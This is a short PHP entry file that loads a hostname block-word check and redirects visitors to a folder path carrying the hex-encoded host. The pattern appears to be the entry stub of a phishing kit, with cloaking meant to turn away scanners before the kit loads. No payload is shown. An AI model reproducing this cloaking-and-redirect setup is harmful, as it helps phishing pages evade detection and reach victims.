<?php
/*
* index.php
*/




//Call Log Files
require_once 'en/hostname.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$index="en/?$host";

header("location: $index");


?>
